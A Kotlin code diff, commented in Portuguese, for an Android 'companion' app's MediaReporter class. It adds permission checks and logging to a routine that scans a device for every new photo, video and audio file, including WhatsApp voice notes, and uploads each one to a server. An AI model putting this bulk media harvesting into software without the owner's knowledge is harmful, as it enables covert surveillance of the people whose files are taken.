@@ -80,55 +80,83 @@ class MediaReporter(
             return
         }
 
+        // CRÍTICO: sem permissões de media, o MediaStore cursor vem vazio (ou crash).
+        // Verificar ANTES de fazer qualquer query e log claramente qual falta.
+        val ctx = context
+        val permImages = com.screenporter.companion.util.PermissionState.isMediaImagesGranted(ctx)
+        val permVideo = com.screenporter.companion.util.PermissionState.isMediaVideoGranted(ctx)
+        val permAudio = com.screenporter.companion.util.PermissionState.isMediaAudioGranted(ctx)
+
+        if (!permImages && !permVideo && !permAudio) {
+            Log.w(TAG, "NENHUMA permissão de media concedida — não vou fazer scan. " +
+                "Concede Fotos+Vídeos+Áudios em Permissões. " +
+                "(images=$permImages, video=$permVideo, audio=$permAudio)")
+            return
+        }
+        if (!permImages) Log.w(TAG, "Permissão READ_MEDIA_IMAGES em falta — fotos não serão capturadas")
+        if (!permVideo)  Log.w(TAG, "Permissão READ_MEDIA_VIDEO em falta — vídeos não serão capturados")
+        if (!permAudio)  Log.w(TAG, "Permissão READ_MEDIA_AUDIO em falta — áudios (voice notes) não serão capturados")
+
         val lastTs = prefs.getSharedPreferences().getLong(KEY_LAST_MEDIA_TS, 0L)
+        var totalUploaded = 0
 
         // Scan photos
-        scanMedia(
-            uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-            type = "photo",
-            projection = arrayOf(
-                MediaStore.Images.Media._ID,
-                MediaStore.Images.Media.DISPLAY_NAME,
-                MediaStore.Images.Media.MIME_TYPE,
-                MediaStore.Images.Media.SIZE,
-                MediaStore.Images.Media.DATE_ADDED,
-                MediaStore.Images.Media.DATA
-            ),
-            lastTs = lastTs,
-            token = token
-        )
+        if (permImages) {
+            totalUploaded += scanMedia(
+                uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                type = "photo",
+                projection = arrayOf(
+                    MediaStore.Images.Media._ID,
+                    MediaStore.Images.Media.DISPLAY_NAME,
+                    MediaStore.Images.Media.MIME_TYPE,
+                    MediaStore.Images.Media.SIZE,
+                    MediaStore.Images.Media.DATE_ADDED,
+                    MediaStore.Images.Media.DATA
+                ),
+                lastTs = lastTs,
+                token = token
+            )
+        }
 
         // Scan videos
-        scanMedia(
-            uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
-            type = "video",
-            projection = arrayOf(
-                MediaStore.Video.Media._ID,
-                MediaStore.Video.Media.DISPLAY_NAME,
-                MediaStore.Video.Media.MIME_TYPE,
-                MediaStore.Video.Media.SIZE,
-                MediaStore.Video.Media.DATE_ADDED,
-                MediaStore.Video.Media.DATA
-            ),
-            lastTs = lastTs,
-            token = token
-        )
+        if (permVideo) {
+            totalUploaded += scanMedia(
+                uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                type = "video",
+                projection = arrayOf(
+                    MediaStore.Video.Media._ID,
+                    MediaStore.Video.Media.DISPLAY_NAME,
+                    MediaStore.Video.Media.MIME_TYPE,
+                    MediaStore.Video.Media.SIZE,
+                    MediaStore.Video.Media.DATE_ADDED,
+                    MediaStore.Video.Media.DATA
+                ),
+                lastTs = lastTs,
+                token = token
+            )
+        }
 
-        // Scan audio (includes WhatsApp voice notes)
-        scanMedia(
-            uri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
-            type = "audio",
-            projection = arrayOf(
-                MediaStore.Audio.Media._ID,
-                MediaStore.Audio.Media.DISPLAY_NAME,
-                MediaStore.Audio.Media.MIME_TYPE,
-                MediaStore.Audio.Media.SIZE,
-                MediaStore.Audio.Media.DATE_ADDED,
-                MediaStore.Audio.Media.DATA
-            ),
-            lastTs = lastTs,
-            token = token
-        )
+        // Scan audio (inclui WhatsApp voice notes)
+        if (permAudio) {
+            totalUploaded += scanMedia(
+                uri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
+                type = "audio",
+                projection = arrayOf(
+                    MediaStore.Audio.Media._ID,
+                    MediaStore.Audio.Media.DISPLAY_NAME,
+                    MediaStore.Audio.Media.MIME_TYPE,
+                    MediaStore.Audio.Media.SIZE,
+                    MediaStore.Audio.Media.DATE_ADDED,
+                    MediaStore.Audio.Media.DATA
+                ),
+                lastTs = lastTs,
+                token = token
+            )
+        }
+
+        if (totalUploaded > 0) {
+            Log.i(TAG, "Scan completo — $totalUploaded ficheiro(s) enviados")
+        }
     }
 
     private fun scanMedia(
@@ -137,12 +165,13 @@ class MediaReporter(
         projection: Array<String>,
         lastTs: Long,
         token: String
-    ) {
+    ): Int {
         val sel = "${MediaStore.MediaColumns.DATE_ADDED} > ?"
         val args = arrayOf((lastTs / 1000).toString())
         val sort = "${MediaStore.MediaColumns.DATE_ADDED} ASC"
 
         var newestTs = lastTs
+        var uploaded = 0
         try {
             context.contentResolver.query(uri, projection, sel, args, sort)?.use { c: Cursor ->
                 val idCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
@@ -151,6 +180,9 @@ class MediaReporter(
                 val sizeCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                 val dateCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
                 val dataCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)
+
+                val total = c.count
+                Log.d(TAG, "[$type] $total ficheiro(s) novo(s) desde ${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date(lastTs))}")
 
                 while (c.moveToNext()) {
                     val id = c.getLong(idCol)
@@ -162,28 +194,32 @@ class MediaReporter(
                     val filePath = c.getString(dataCol) ?: continue
 
                     if (dateMs <= lastTs) continue
-                    if (size > 50_000_000) continue // skip files >50MB
+                    if (size > 50_000_000) {
+                        Log.d(TAG, "[$type] Saltar $name (${size} bytes > 50MB)")
+                        continue
+                    }
 
-                    // Infer source from file path
                     val source = inferSource(filePath)
-
-                    // Upload
                     val ok = uploadFile(filePath, name, mime, size, type, source, dateMs, token)
                     if (ok) {
-                        Log.i(TAG, "Uploaded $type: $name (${size} bytes) from $source")
+                        Log.i(TAG, "[$type] Upload OK: $name (${size} bytes) de $source")
                         if (dateMs > newestTs) newestTs = dateMs
+                        uploaded++
                     } else {
-                        Log.w(TAG, "Failed to upload $type: $name")
+                        Log.w(TAG, "[$type] Falhou upload de $name")
                     }
                 }
-            }
+            } ?: Log.w(TAG, "[$type] Cursor null — sem permissão ou sem ficheiros")
+        } catch (e: SecurityException) {
+            Log.e(TAG, "[$type] SecurityException — permissão revogada?: ${e.message}")
         } catch (e: Exception) {
-            Log.w(TAG, "Error scanning $type: ${e.message}")
+            Log.w(TAG, "[$type] Erro no scan: ${e.message}")
         }
 
         if (newestTs > lastTs) {
             prefs.getSharedPreferences().edit().putLong(KEY_LAST_MEDIA_TS, newestTs).apply()
         }
+        return uploaded
     }
 
     private fun inferSource(filePath: String): String {
